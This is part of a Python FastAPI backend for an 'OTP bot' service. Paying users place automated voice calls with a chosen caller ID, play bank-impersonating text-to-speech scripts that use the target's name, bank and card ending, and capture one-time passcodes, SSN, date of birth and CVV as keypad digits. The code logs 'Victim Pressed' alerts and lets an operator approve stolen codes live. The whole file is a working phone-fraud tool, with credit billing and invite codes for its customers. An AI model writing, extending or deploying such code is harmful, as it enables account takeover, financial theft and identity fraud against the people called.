    """Update user (admin only)"""
    user = await db.users.find_one({"id": user_id}, {"_id": 0})
    if not user:
        raise HTTPException(status_code=404, detail="User not found")
    
    # Build update dict
    update_data = {}
    if user_data.name is not None:
        update_data["name"] = user_data.name
    if user_data.email is not None:
        update_data["email"] = user_data.email
    if user_data.is_active is not None:
        update_data["is_active"] = user_data.is_active
    if user_data.credits is not None:
        update_data["credits"] = user_data.credits
    
    if update_data:
        await db.users.update_one({"id": user_id}, {"$set": update_data})
        await log_activity(admin["id"], "user_updated", {"updated_user_id": user_id, "changes": update_data})
    
    return {"message": "User updated successfully"}

@admin_router.delete("/users/{user_id}")
async def delete_user(user_id: str, admin: dict = Depends(get_admin_user)):
    """Delete user (admin only)"""
    if user_id == admin["id"]:
        raise HTTPException(status_code=400, detail="Cannot delete yourself")
    
    result = await db.users.delete_one({"id": user_id})
    if result.deleted_count == 0:
        raise HTTPException(status_code=404, detail="User not found")
    
    await log_activity(admin["id"], "user_deleted", {"deleted_user_id": user_id})
    
    return {"message": "User deleted successfully"}

@admin_router.post("/users/{user_id}/credits")
async def add_credits(user_id: str, credit_data: CreditUpdate, admin: dict = Depends(get_admin_user)):
    """Add or deduct credits (admin only)"""
    user = await db.users.find_one({"id": user_id}, {"_id": 0})
    if not user:
        raise HTTPException(status_code=404, detail="User not found")
    
    new_credits = user.get("credits", 0) + credit_data.amount
    if new_credits < 0:
        raise HTTPException(status_code=400, detail="Insufficient credits")
    
    await db.users.update_one(
        {"id": user_id},
        {"$set": {"credits": new_credits}}
    )
    
    await log_activity(admin["id"], "credit_added" if credit_data.amount > 0 else "credit_deducted", {
        "target_user_id": user_id,
        "amount": credit_data.amount,
        "new_balance": new_credits,
        "reason": credit_data.reason
    })
    
    return {"message": "Credits updated", "new_credits": new_credits}


@admin_router.delete("/invitation-codes/{code_id}")
async def delete_invitation_code(code_id: str, admin: dict = Depends(get_admin_user)):
    """Delete unused invitation code (admin only)"""
    code = await db.invitation_codes.find_one({"id": code_id}, {"_id": 0})
    if not code:
        raise HTTPException(status_code=404, detail="Code not found")
    
    if code.get("is_used"):
        raise HTTPException(status_code=400, detail="Cannot delete used invitation code")
    
    await db.invitation_codes.delete_one({"id": code_id})
    await log_activity(admin["id"], "invitation_code_deleted", {"code": code.get("code")})
    
    return {"message": "Invitation code deleted"}


@admin_router.post("/users/{user_id}/reset-password")
async def reset_user_password(user_id: str, new_password: str, admin: dict = Depends(get_admin_user)):
    """Reset user password (admin only)"""
    user = await db.users.find_one({"id": user_id}, {"_id": 0})
    if not user:
        raise HTTPException(status_code=404, detail="User not found")
    
    # Hash new password
    new_password_hash = hash_password(new_password)
    
    await db.users.update_one(
        {"id": user_id},
        {"$set": {"password_hash": new_password_hash}}
    )
    
    await log_activity(admin["id"], "password_reset", {
        "target_user_id": user_id,
        "target_email": user.get("email")
    })


@admin_router.post("/invitation-codes/generate")
async def generate_invitation_code(credits: float = 10, admin: dict = Depends(get_admin_user)):
    """Generate invitation code (admin only)"""
    code = str(uuid.uuid4())[:8].upper()  # Short code
    
    invite_doc = {
        "id": str(uuid.uuid4()),
        "code": code,
        "created_by": admin["id"],
        "created_by_role": "admin",
        "credits_for_new_user": credits,
        "is_used": False,
        "used_by": None,
        "created_at": datetime.now(timezone.utc).isoformat(),
        "used_at": None
    }
    
    await db.invitation_codes.insert_one(invite_doc)
    await log_activity(admin["id"], "invitation_code_generated", {"code": code, "credits": credits})
    
    return {"code": code, "credits": credits}

@admin_router.get("/invitation-codes")
async def get_invitation_codes(admin: dict = Depends(get_admin_user)):
    """Get all invitation codes (admin only)"""
    codes = await db.invitation_codes.find({}, {"_id": 0}).sort("created_at", -1).limit(100).to_list(100)
    return {"codes": codes}

    
    return {"message": "Password reset successfully"}


@admin_router.get("/activities")
async def get_all_activities(limit: int = 100, admin: dict = Depends(get_admin_user)):
    """Get all user activities (admin only)"""
    activities = await db.user_activities.find({}, {"_id": 0}).sort("timestamp", -1).limit(limit).to_list(limit)
    return {"activities": activities}

@admin_router.get("/calls")
async def get_all_calls(limit: int = 100, admin: dict = Depends(get_admin_user)):
    """Get all call history (admin only)"""
    calls = await db.call_history.find({}, {"_id": 0}).sort("created_at", -1).limit(limit).to_list(limit)
    return {"calls": calls}

@admin_router.get("/stats")
async def get_admin_stats(admin: dict = Depends(get_admin_user)):
    """Get dashboard stats (admin only)"""
    total_users = await db.users.count_documents({})
    active_users = await db.users.count_documents({"is_active": True})
    
    # Calls today
    today_start = datetime.now(timezone.utc).replace(hour=0, minute=0, second=0, microsecond=0).isoformat()
    total_calls_today = await db.call_history.count_documents({"created_at": {"$gte": today_start}})
    total_calls_all = await db.call_history.count_documents({})
    
    # Credits stats
    users_list = await db.users.find({}, {"_id": 0, "credits": 1}).to_list(1000)
    total_credits_distributed = sum(u.get("credits", 0) for u in users_list)
    
    calls_list = await db.call_history.find({}, {"_id": 0, "cost_credits": 1}).to_list(10000)
    total_credits_spent = sum(c.get("cost_credits", 0) for c in calls_list)
    
    return {
        "total_users": total_users,
        "active_users": active_users,
        "total_calls_today": total_calls_today,
        "total_calls_all_time": total_calls_all,
        "total_credits_distributed": total_credits_distributed,
        "total_credits_spent": total_credits_spent
    }

# ==================== USER PROFILE ROUTES ====================

@user_router.get("/profile")
async def get_profile(current_user: dict = Depends(get_current_user)):
    """Get current user profile"""
    return UserResponse(
        id=current_user["id"],
        email=current_user["email"],
        name=current_user["name"],
        role=current_user.get("role", "user"),
        credits=current_user.get("credits", 0),
        is_active=current_user.get("is_active", True),
        created_at=current_user["created_at"]
    )

@user_router.put("/password")
async def change_password(password_data: PasswordChange, current_user: dict = Depends(get_current_user)):
    """Change password"""
    user = await db.users.find_one({"id": current_user["id"]}, {"_id": 0})
    if not verify_password(password_data.current_password, user["password_hash"]):
        raise HTTPException(status_code=400, detail="Current password is incorrect")
    
    new_password_hash = hash_password(password_data.new_password)
    await db.users.update_one(
        {"id": current_user["id"]},
        {"$set": {"password_hash": new_password_hash}}
    )
    
    await log_activity(current_user["id"], "password_changed", {})
    
    return {"message": "Password changed successfully"}

@user_router.get("/dashboard-stats")
async def get_dashboard_stats(current_user: dict = Depends(get_current_user)):
    """Get dashboard statistics for current user"""
    user_id = current_user["id"]
    
    # Get call history stats
    pipeline = [
        {"$match": {"user_id": user_id}},
        {"$group": {
            "_id": None,
            "total_calls": {"$sum": 1},
            "total_duration": {"$sum": "$duration_seconds"},
            "total_cost": {"$sum": "$cost_credits"},
            "successful": {"$sum": {"$cond": [{"$eq": ["$status", "completed"]}, 1, 0]}},
            "failed": {"$sum": {"$cond": [{"$eq": ["$status", "failed"]}, 1, 0]}},
            "busy": {"$sum": {"$cond": [{"$eq": ["$status", "busy"]}, 1, 0]}},
            "no_answer": {"$sum": {"$cond": [{"$eq": ["$status", "no_answer"]}, 1, 0]}},
            "voicemail": {"$sum": {"$cond": [{"$eq": ["$status", "voicemail_detected"]}, 1, 0]}},
            "fax": {"$sum": {"$cond": [{"$eq": ["$status", "fax_detected"]}, 1, 0]}},
            "beep": {"$sum": {"$cond": [{"$eq": ["$status", "beep_detected"]}, 1, 0]}},
            "music": {"$sum": {"$cond": [{"$eq": ["$status", "music_detected"]}, 1, 0]}}
        }}
    ]
    
    result = await db.call_history.aggregate(pipeline).to_list(1)
    
    # Count OTPs captured
    otp_count = await db.otp_sessions.count_documents({
        "user_id": user_id,
        "otp_received": {"$exists": True, "$ne": None}
    })
    
    if result:
        stats = result[0]
        total_calls = stats.get("total_calls", 0)
        successful = stats.get("successful", 0)
        success_rate = (successful / total_calls * 100) if total_calls > 0 else 0
        avg_duration = stats.get("total_duration", 0) / total_calls if total_calls > 0 else 0
        
        return {
            "total_calls": total_calls,
            "successful": successful,
            "failed": stats.get("failed", 0),
            "busy": stats.get("busy", 0),
            "no_answer": stats.get("no_answer", 0),
            "voicemail": stats.get("voicemail", 0),
            "fax": stats.get("fax", 0),
            "beep": stats.get("beep", 0),
            "music": stats.get("music", 0),
            "otp_captured": otp_count,
            "avg_duration_seconds": int(avg_duration),
            "total_duration_seconds": stats.get("total_duration", 0),
            "total_cost_credits": stats.get("total_cost", 0),
            "success_rate": round(success_rate, 2)
        }
    
    return {
        "total_calls": 0,
        "successful": 0,
        "failed": 0,
        "busy": 0,
        "no_answer": 0,
        "voicemail": 0,
        "fax": 0,
        "beep": 0,
        "music": 0,
        "otp_captured": otp_count,
        "avg_duration_seconds": 0,
        "total_duration_seconds": 0,
        "total_cost_credits": 0,
        "success_rate": 0
    }

@user_router.get("/calls")
async def get_user_calls(limit: int = 50, current_user: dict = Depends(get_current_user)):
    """Get user's own call history"""
    calls = await db.call_history.find(
        {"user_id": current_user["id"]},
        {"_id": 0}
    ).sort("created_at", -1).limit(limit).to_list(limit)
    return {"calls": calls}

@user_router.post("/generate-invite")
async def user_generate_invite(current_user: dict = Depends(get_current_user)):
    """User generates their own invitation code (1 per user) - Costs 50 credits"""
    # Check if user already generated a code
    existing = await db.invitation_codes.find_one({
        "created_by": current_user["id"],
        "created_by_role": "user"
    }, {"_id": 0})
    
    if existing:
        return {"code": existing["code"], "is_used": existing["is_used"], "message": "You already have an invitation code"}
    
    # Check if user has enough credits (50 credits required)
    user_credits = current_user.get("credits", 0)
    if user_credits < 50:
        raise HTTPException(status_code=402, detail="Insufficient credits. You need 50 credits to generate an invitation code.")
    
    # Deduct 50 credits
    await db.users.update_one(
        {"id": current_user["id"]},
        {"$inc": {"credits": -50}}
    )
    
    # Generate new code
    code = str(uuid.uuid4())[:8].upper()
    
    invite_doc = {
        "id": str(uuid.uuid4()),
        "code": code,
        "created_by": current_user["id"],
        "created_by_role": "user",
        "credits_for_new_user": 0,  # User-generated invites give 0 credits (only admin can give credits)
        "is_used": False,
        "used_by": None,
        "created_at": datetime.now(timezone.utc).isoformat(),
        "used_at": None
    }
    
    await db.invitation_codes.insert_one(invite_doc)
    
    # Log activities
    await log_activity(current_user["id"], "invitation_code_generated", {"code": code, "cost": 50})
    await log_activity(current_user["id"], "credit_deducted", {"amount": -50, "reason": "Generated invitation code", "new_balance": user_credits - 50})
    
    return {"code": code, "message": "Invitation code generated successfully. 50 credits deducted."}

@user_router.get("/my-invite")
async def get_my_invite(current_user: dict = Depends(get_current_user)):
    """Get user's own invitation code"""
    code = await db.invitation_codes.find_one({
        "created_by": current_user["id"],
        "created_by_role": "user"
    }, {"_id": 0})
    
    return {"code": code}

@user_router.get("/credits")
async def get_user_credits(current_user: dict = Depends(get_current_user)):
    """Get user's current credits"""
    user = await db.users.find_one({"id": current_user["id"]}, {"_id": 0, "credits": 1})
    return {"credits": user.get("credits", 0)}

@user_router.get("/stats")
async def get_user_stats(current_user: dict = Depends(get_current_user)):
    """Get user's statistics"""
    pipeline = [
        {"$match": {"user_id": current_user["id"]}},
        {"$group": {
            "_id": None,
            "total_calls": {"$sum": 1},
            "total_duration": {"$sum": "$duration_seconds"},
            "total_spent": {"$sum": "$cost_credits"},
            "successful": {"$sum": {"$cond": [{"$eq": ["$status", "completed"]}, 1, 0]}}
        }}
    ]
    
    result = await db.call_history.aggregate(pipeline).to_list(1)
    if result:
        stats = result[0]
        return {
            "total_calls": stats.get("total_calls", 0),
            "total_duration_seconds": stats.get("total_duration", 0),
            "total_credits_spent": stats.get("total_spent", 0),
            "successful_calls": stats.get("successful", 0)
        }
    
    return {"total_calls": 0, "total_duration_seconds": 0, "total_credits_spent": 0, "successful_calls": 0}

# ==================== OTP BOT ROUTES ====================

@otp_router.post("/initiate-call")
async def initiate_otp_call(config: OTPCallConfig, current_user: dict = Depends(get_current_user)):
    """Initiate an OTP bot call"""
    
    # Check credits (minimum 1 credit required to start)
    user_credits = current_user.get("credits", 0)
    if user_credits < 1:
        raise HTTPException(status_code=402, detail="Insufficient credits. Please contact admin to add credits.")
    
    # Deduct initial 1 credit (will calculate actual cost at end based on duration)
    await db.users.update_one(
        {"id": current_user["id"]},
        {"$inc": {"credits": -1}}
    )
    
    session_id = str(uuid.uuid4())
    now = datetime.now(timezone.utc).isoformat()
    
    # Format messages - replace all placeholders
    step1_text = (config.step1_message
                  .replace("{name}", config.recipient_name)
                  .replace("{service}", config.service_name)
                  .replace("{bank_name}", config.bank_name)
                  .replace("{card_type}", config.card_type)
                  .replace("{ending_card}", config.ending_card))
    
    step2_text = (config.step2_message
                  .replace("{digits}", str(config.otp_digits))
                  .replace("{bank_name}", config.bank_name)
                  .replace("{card_type}", config.card_type)
                  .replace("{ending_card}", config.ending_card))
    
    step3_text = (config.step3_message
                  .replace("{name}", config.recipient_name)
                  .replace("{service}", config.service_name)
                  .replace("{bank_name}", config.bank_name)
                  .replace("{card_type}", config.card_type)
                  .replace("{ending_card}", config.ending_card))
    
    accepted_text = (config.accepted_message
                     .replace("{name}", config.recipient_name)
                     .replace("{service}", config.service_name)
                     .replace("{bank_name}", config.bank_name)
                     .replace("{card_type}", config.card_type)
                     .replace("{ending_card}", config.ending_card))
    
    rejected_text = (config.rejected_message
                     .replace("{digits}", str(config.otp_digits))
                     .replace("{bank_name}", config.bank_name)
                     .replace("{card_type}", config.card_type)
                     .replace("{ending_card}", config.ending_card))
    
    # Create session
    session_doc = {
        "id": session_id,
        "user_id": current_user["id"],
        "recipient_number": config.recipient_number,
        "caller_id": config.caller_id,
        "recipient_name": config.recipient_name,
        "service_name": config.service_name,
        "otp_digits": config.otp_digits,
        "language": config.language,
        "voice_name": config.voice_name,
        "voice_provider": config.voice_provider,
        "status": "initiating",
        "current_step": 0,
        "call_id": None,
        "first_input": None,
        "otp_received": None,
        "otp_digits_collected": "",
        "info_type": "phone_otp",
        "created_at": now,
        "logs": [],
        "messages": {
            "step1": step1_text,
            "step2": step2_text,
            "step3": step3_text,
            "accepted": accepted_text,
            "rejected": rejected_text
        }
    }
    
    await db.otp_sessions.insert_one(session_doc)
    
    # Pre-generate audio files if using ElevenLabs/Deepgram
    audio_urls = {}
    if config.voice_provider != "infobip":
        # Get emoji for provider
        provider_emoji = "⚡" if config.voice_provider == "elevenlabs" else "🌊"
        await emit_log(session_id, "info", f"🤖 Generating {provider_emoji} voices...")
        
        try:
            # Generate all audio files in parallel
            messages_to_generate = {
                "step1": step1_text,
                "step2": step2_text,
                "step3": step3_text,
                "accepted": accepted_text,
                "rejected": rejected_text
            }
            
            # Generate all audio files IN PARALLEL for speed
            async def generate_and_save(msg_type, msg_text):
                if config.voice_provider == "elevenlabs":
                    audio_bytes = await generate_tts_elevenlabs(msg_text, config.voice_name)
                elif config.voice_provider == "deepgram":
                    audio_bytes = await generate_tts_deepgram(msg_text, config.voice_name)
                
                # Save audio file
                audio_filename = f"{session_id}_{msg_type}.mp3"
                audio_path = f"/app/frontend/public/temp_audio/{audio_filename}"
                os.makedirs("/app/frontend/public/temp_audio", exist_ok=True)
                
                with open(audio_path, "wb") as f:
                    f.write(audio_bytes)
                
                # Return URL
                return msg_type, f"{WEBHOOK_BASE_URL.replace('/api', '')}/temp_audio/{audio_filename}"
            
            # Generate all in parallel
            tasks = [generate_and_save(msg_type, msg_text) for msg_type, msg_text in messages_to_generate.items()]
            results = await asyncio.gather(*tasks)
            
            # Store URLs
            for msg_type, url in results:
                audio_urls[msg_type] = url
            
            # Store audio URLs in session
            await db.otp_sessions.update_one(
                {"id": session_id},
                {"$set": {"audio_urls": audio_urls}}
            )
            session_doc["audio_urls"] = audio_urls
            
            await emit_log(session_id, "success", f"✅ {provider_emoji} voices generated!")
            
        except Exception as e:
            logger.error(f"Error generating audio: {e}")
            await emit_log(session_id, "warning", f"⚠️ Voice generation failed, using Infobip fallback")
    else:
        await emit_log(session_id, "success", "✅ Call initiated")
    
    try:
        # Create outbound call
        result = await create_outbound_call(config.recipient_number, config.caller_id)
        
        if result["status_code"] in [200, 201]:
            call_data = result["data"]
            call_id = call_data.get("id")
            
            # Store mappings
            call_to_session[call_id] = session_id
            active_sessions[session_id] = {**session_doc, "call_id": call_id}
            
            await db.otp_sessions.update_one(
                {"id": session_id},
                {"$set": {"call_id": call_id, "status": "calling"}}
            )
            
            await emit_log(session_id, "info", "📞 Calling...")
            
            # Start background task to play TTS after call is established
            # This handles the case where webhook doesn't arrive
            asyncio.create_task(wait_and_play_step1(session_id, session_doc, call_id))
            
            return {
                "session_id": session_id,
                "call_id": call_id,
                "status": "calling"
            }
        else:
            error_msg = result["data"].get("requestError", {}).get("serviceException", {}).get("text", "Unknown error")
            await emit_log(session_id, "error", f"❌ Failed: {error_msg}")
            raise HTTPException(status_code=500, detail=error_msg)
            
    except Exception as e:
        await emit_log(session_id, "error", f"❌ Error: {str(e)}")
        raise HTTPException(status_code=500, detail=str(e))

@otp_router.post("/webhook/call-events")
async def handle_call_events(request: Request):
    """Handle all Infobip call events"""
    try:
        body = await request.json()
        logger.info(f"📞 Webhook received: {json.dumps(body, indent=2)}")
        
        call_id = body.get("callId") or body.get("id")
        event_type = body.get("type", "UNKNOWN")
        
        # Find session
        session_id = call_to_session.get(call_id)
        if not session_id:
            # Try from database
            session = await db.otp_sessions.find_one({"call_id": call_id}, {"_id": 0})
            if session:
                session_id = session["id"]
                call_to_session[call_id] = session_id
                active_sessions[session_id] = session
        
        if not session_id:
            logger.warning(f"No session for call {call_id}")
            return {"status": "no_session"}
        
        # Always get fresh session from database
        session = await db.otp_sessions.find_one({"id": session_id}, {"_id": 0})
        if not session:
            return {"status": "session_not_found"}
        
        # Update active session cache
        active_sessions[session_id] = session
        
        # Handle events
        if event_type == "CALL_RINGING":
            await emit_log(session_id, "info", "📱 Ringing...")
            
        elif event_type == "CALL_ESTABLISHED":
            await emit_log(session_id, "success", "✅ Call Answered")
            
            # Record call start time for duration tracking
            call_start_time = datetime.now(timezone.utc).isoformat()
            
            # Update status
            await db.otp_sessions.update_one(
                {"id": session_id},
                {"$set": {
                    "status": "step1", 
                    "current_step": 1,
                    "call_start_time": call_start_time
                }}
            )
            active_sessions[session_id]["current_step"] = 1
            active_sessions[session_id]["status"] = "step1"
            active_sessions[session_id]["call_start_time"] = call_start_time
            
            # Log call started activity
            await log_activity(session.get("user_id"), "call_started", {
                "session_id": session_id,
                "call_id": call_id,
                "recipient_number": session.get("recipient_number")
            })
            
            # Play Step 1 greeting and start DTMF capture in background
            asyncio.create_task(play_step1_and_capture(session_id, session, call_id))
            
        elif event_type == "CALL_FINISHED":
            reason = body.get("errorCode", {}).get("name", "completed")
            await emit_log(session_id, "info", f"📴 Call ended: {reason}")
            
            # Calculate call duration and save history
            await save_call_history(session_id, session, call_id, "completed" if reason == "completed" else reason)
            
            # Try to get recording URL
            asyncio.create_task(fetch_and_emit_recording(session_id, call_id))
            
            await db.otp_sessions.update_one(
                {"id": session_id},
                {"$set": {"status": "completed"}}
            )
            # Cleanup
            if call_id in call_to_session:
                del call_to_session[call_id]
            if session_id in active_sessions:
                del active_sessions[session_id]
                
        elif event_type == "CALL_FAILED":
            error = body.get("errorCode", {}).get("description", "Unknown")
            await emit_log(session_id, "error", f"❌ Call failed: {error}")
            await db.otp_sessions.update_one(
                {"id": session_id},
                {"$set": {"status": "failed"}}
            )
            
        elif event_type == "SAY_FINISHED":
            # TTS finished - check if we need to start DTMF capture
            logger.info(f"TTS finished on {call_id}")
            # Don't start DTMF capture here - it's handled by wait_and_play_step1
            # await handle_say_finished(session_id, session, call_id)
            
        elif event_type == "DTMF_CAPTURED":
            # Handle both expected and unexpected DTMF
            # DTMF can be in body.dtmf or body.properties.dtmf
            dtmf_value = body.get("dtmf") or body.get("properties", {}).get("dtmf", "")
            capture_requested = body.get("captureRequested")
            if capture_requested is None:
                capture_requested = body.get("properties", {}).get("captureRequested", True)
            
            logger.info(f"DTMF_CAPTURED: dtmf={dtmf_value}, captureRequested: {capture_requested}")
            
            # Process DTMF regardless of captureRequested - user pressed a key
            if dtmf_value:
                await handle_dtmf(session_id, session, call_id, dtmf_value)
            
        elif event_type == "CAPTURE_FINISHED":
            # DTMF capture timeout or finished
            dtmf_value = body.get("dtmf") or body.get("properties", {}).get("dtmf", "")
            logger.info(f"CAPTURE_FINISHED: dtmf={dtmf_value}")
            if dtmf_value:
                await handle_dtmf(session_id, session, call_id, dtmf_value)

        
        elif event_type == "MACHINE_DETECTION_FINISHED":
            # AMD detection finished - get result from properties
            detection_result = body.get("properties", {}).get("detectionResult", "")
            confidence_rating = body.get("properties", {}).get("confidenceRating", {})
            
            logger.info(f"AMD FINISHED: result={detection_result}, confidence={confidence_rating}")
            
            if detection_result:
                await emit_log(session_id, "amd", f"🤖 AMD Result: {detection_result}", {"result": detection_result})
                
                # Update session with AMD result
                await db.otp_sessions.update_one(
                    {"id": session_id},
                    {"$set": {"amd_result": detection_result}}
                )
                if session_id in active_sessions:
                    active_sessions[session_id]["amd_result"] = detection_result
                
                # Handle non-human results immediately
                if detection_result == "MACHINE":
                    await emit_log(session_id, "warning", "📼 Voicemail detected - ending call in 10 seconds")
                    await db.otp_sessions.update_one({"id": session_id}, {"$set": {"status": "voicemail_detected"}})
                    await asyncio.sleep(10)
                    await hangup_call(call_id)
                    await emit_log(session_id, "info", "📴 Call ended: Voicemail detected")
                    await save_call_history(session_id, session, call_id, "voicemail_detected")
                    
                elif detection_result == "FAX":
                    await emit_log(session_id, "warning", "📠 Fax machine - ending call")
                    await db.otp_sessions.update_one({"id": session_id}, {"$set": {"status": "fax_detected"}})
                    await hangup_call(call_id)
                    await emit_log(session_id, "info", "📴 Call ended: Fax detected")
                    await save_call_history(session_id, session, call_id, "fax_detected")
                    
                elif detection_result == "BEEP":
                    await emit_log(session_id, "warning", "📯 Beep detected - ending call in 10 seconds")
                    await db.otp_sessions.update_one({"id": session_id}, {"$set": {"status": "beep_detected"}})
                    await asyncio.sleep(10)
                    await hangup_call(call_id)
                    await emit_log(session_id, "info", "📴 Call ended: Beep detected")
                    await save_call_history(session_id, session, call_id, "beep_detected")
                    
                elif detection_result == "SILENCE":
                    await emit_log(session_id, "warning", "🔇 Silence detected - continuing call")
                    # Continue normal flow
                    
                elif detection_result == "NOISE":
                    await emit_log(session_id, "warning", "📢 Noise detected - continuing call")
                    # Continue normal flow
                    
                elif detection_result == "MUSIC":
                    await emit_log(session_id, "warning", "🎵 Music detected - ending call")
                    await db.otp_sessions.update_one({"id": session_id}, {"$set": {"status": "music_detected"}})
                    await hangup_call(call_id)
                    await emit_log(session_id, "info", "📴 Call ended: Music detected")
                    await save_call_history(session_id, session, call_id, "music_detected")
                    
                elif detection_result == "OTHER":
                    await emit_log(session_id, "warning", "❓ Unknown detection - continuing call")
        
        elif event_type == "MACHINE_DETECTION_FAILED":
            await emit_log(session_id, "warning", "⚠️ AMD detection failed - continuing call")

        
        return {"status": "processed"}
        
    except Exception as e:
        logger.error(f"Webhook error: {e}", exc_info=True)
        return {"status": "error", "message": str(e)}

async def play_step1_and_capture(session_id: str, session: dict, call_id: str):
    """Play Step 1 greeting and start DTMF capture"""
    try:
        await emit_log(session_id, "step", "🎙️ Playing Step 1 message...")
        step1_text = session["messages"]["step1"]
        await play_tts(call_id, step1_text, session.get("language", "en"), session_id)
        # Note: DTMF capture will be started after SAY_FINISHED event
    except Exception as e:
        logger.error(f"Error in play_step1_and_capture: {e}")

async def play_tts_and_capture_info(session_id: str, session: dict, call_id: str, config: dict):
    """Play TTS for info request and start DTMF capture (non-blocking background task)"""
    try:
        # Play TTS message
        await emit_log(session_id, "step", f"🎙️ Requesting {config['label']}...")
        await play_tts(call_id, config["message"], session.get("language", "en"), session_id)
        
        # Wait for TTS to finish (estimate based on word count)
        word_count = len(config["message"].split())
        tts_wait = max(5, int(word_count / 2.5) + 2)
        await asyncio.sleep(tts_wait)
        
        # Start DTMF capture
        await emit_log(session_id, "info", f"⏳ Waiting for {config['digits']}-digit {config['label']}...")
        await start_dtmf_capture(call_id, max_length=config["digits"], timeout=60)
    except Exception as e:
        logger.error(f"Error in play_tts_and_capture_info: {e}")


async def handle_say_finished(session_id: str, session: dict, call_id: str):
    """Handle SAY_FINISHED event - start appropriate DTMF capture"""
    try:
        # Refresh session from DB to get current step
        session = await db.otp_sessions.find_one({"id": session_id}, {"_id": 0})
        if not session:
            return
            
        current_step = session.get("current_step", 1)
        status = session.get("status", "")
        otp_digits = session.get("otp_digits", 6)
        
        logger.info(f"SAY_FINISHED: current_step={current_step}, status={status}")
        
        if current_step == 1 and status == "step1":
            # After Step 1 message, capture 1 digit choice
            await emit_log(session_id, "info", "⏳ Waiting for user input (1 or 0)...")
            await start_dtmf_capture(call_id, max_length=1, timeout=30)
            
        elif current_step == 2 and status == "step2":
            # After Step 2 message, capture OTP digits
            await emit_log(session_id, "info", f"⏳ Waiting for {otp_digits}-digit OTP...")
            await start_dtmf_capture(call_id, max_length=otp_digits, timeout=60)
            
    except Exception as e:
        logger.error(f"Error in handle_say_finished: {e}")

async def handle_dtmf(session_id: str, session: dict, call_id: str, dtmf_value: str):
    """Handle DTMF input based on current step"""
    # Always get fresh session from database to ensure we have current step
    fresh_session = await db.otp_sessions.find_one({"id": session_id}, {"_id": 0})
    if fresh_session:
        session = fresh_session
        active_sessions[session_id] = session
    
    current_step = session.get("current_step", 1)
    status = session.get("status", "step1")
    otp_digits = session.get("otp_digits", 6)
    
    logger.info(f"handle_dtmf: dtmf={dtmf_value}, current_step={current_step}, status={status}")
    
    if current_step == 1 and status in ["step1", "calling"]:
        # Step 1: User pressed 1 or 0
        first_digit = dtmf_value[0] if dtmf_value else ""
        
        # Check if we already processed step 1 recently (prevent duplicate processing)
        last_step1_time = session.get("step1_processed_at")
        if last_step1_time:
            logger.info(f"Step 1 already processed, ignoring duplicate DTMF: {dtmf_value}")
            return
        
        await emit_log(session_id, "warning", f"⚠️ Victim Pressed {first_digit} - Send OTP Now!")
        
        # Stop any existing DTMF capture first
        await stop_dtmf_capture(call_id)
        
        # Update to step 2 - mark step1 as processed with timestamp
        from datetime import datetime, timezone
        await db.otp_sessions.update_one(
            {"id": session_id},
            {"$set": {
                "first_input": first_digit, 
                "current_step": 2, 
                "status": "step2", 
                "otp_digits_collected": "",
                "step1_processed_at": datetime.now(timezone.utc).isoformat(),
                "step2_play_count": 0
            }}
        )
        active_sessions[session_id]["current_step"] = 2
        active_sessions[session_id]["status"] = "step2"
        active_sessions[session_id]["first_input"] = first_digit
        active_sessions[session_id]["otp_digits_collected"] = ""
        active_sessions[session_id]["step1_processed_at"] = datetime.now(timezone.utc).isoformat()
        
        # Play Step 2 with retry (x2) - immediately without delay
        asyncio.create_task(play_step2_with_retry(session_id, session, call_id, otp_digits))
        
    elif current_step == 2 and status in ["step2", "waiting_pin"]:
        # Step 2: Collecting OTP digits or custom info - accumulate digits one by one
        new_digit = dtmf_value.replace("#", "").replace("*", "")
        
        # Get current accumulated digits from session
        current_digits = session.get("otp_digits_collected", "") or ""
        current_digits += new_digit
        
        # Get info type label for display
        info_type = session.get("info_type", "phone_otp")
        info_labels = {
            "phone_otp": "Phone OTP",
            "otp_email": "Email OTP",
            "ssn": "SSN",
            "dob": "Date of Birth",
            "cvv": "CVV"
        }
        info_label = info_labels.get(info_type, "Info")
        
        logger.info(f"{info_label} accumulating: current={current_digits}, need={otp_digits} digits")
        
        # Update accumulated digits in database
        await db.otp_sessions.update_one(
            {"id": session_id},
            {"$set": {"otp_digits_collected": current_digits}}
        )
        active_sessions[session_id]["otp_digits_collected"] = current_digits
        
        # Emit partial info to UI
        await emit_log(session_id, "info", f"🔢 Digit entered: {new_digit} (Total: {current_digits})")
        
        # Check if we have enough digits
        if len(current_digits) >= otp_digits:
            captured_code = current_digits[:otp_digits]
            
            # Stop DTMF capture
            await stop_dtmf_capture(call_id)
            
            # Emit captured info with appropriate label
            await emit_log(session_id, "otp", f"🔑 {info_label} Captured: {captured_code}", {"otp": captured_code, "info_type": info_type})
            
            # Update to step 3 FIRST before playing TTS
            await db.otp_sessions.update_one(
                {"id": session_id},
                {"$set": {"otp_received": captured_code, "current_step": 3, "status": "waiting_approval", "otp_digits_collected": ""}}
            )
            active_sessions[session_id]["current_step"] = 3
            active_sessions[session_id]["status"] = "waiting_approval"
            active_sessions[session_id]["otp_received"] = captured_code
            
            # Play Step 3 TTS immediately (not as background task)
            await emit_log(session_id, "step", "🎙️ Playing Step 3: Verification Wait...")
            step3_text = session["messages"]["step3"]
            await play_tts(call_id, step3_text, session.get("language", "en"), session_id)
            await emit_log(session_id, "action", "⏳ Waiting for admin approval...")
            
            # Start Step 3 retry loop in background
            asyncio.create_task(play_step3_retry_only(session_id, session, call_id))
        
    else:
        logger.warning(f"Unexpected DTMF: dtmf={dtmf_value}, step={current_step}, status={status}")

@otp_router.post("/accept/{session_id}")
async def accept_otp(session_id: str, current_user: dict = Depends(get_current_user)):
    """Admin accepts the OTP - play accepted message"""
    session = await db.otp_sessions.find_one({"id": session_id}, {"_id": 0})
    if not session:
        raise HTTPException(status_code=404, detail="Session not found")
    
    call_id = session.get("call_id")
    if not call_id:
        raise HTTPException(status_code=400, detail="No active call")
    
    await emit_log(session_id, "action", "✅ Admin pressed ACCEPT")
    
    # Play accepted message
    accepted_text = session["messages"]["accepted"]
    await emit_log(session_id, "step", "🎙️ Playing Accepted message...")
    await play_tts(call_id, accepted_text, session.get("language", "en"), session_id)
    
    # Calculate wait time based on text length (roughly 150 words per minute = 2.5 words per second)
    # Average word length is ~5 characters, so ~12.5 characters per second
    # Add extra buffer for safety
    word_count = len(accepted_text.split())
    wait_time = max(10, int(word_count / 2.5) + 3)  # At least 10 seconds, plus 3 second buffer
    logger.info(f"Waiting {wait_time} seconds for TTS to finish ({word_count} words)")
    
    await asyncio.sleep(wait_time)
    await hangup_call(call_id)
    
    await emit_log(session_id, "success", "📴 Call completed successfully")
    
    await db.otp_sessions.update_one(
        {"id": session_id},
        {"$set": {"status": "completed", "result": "accepted"}}
    )
    
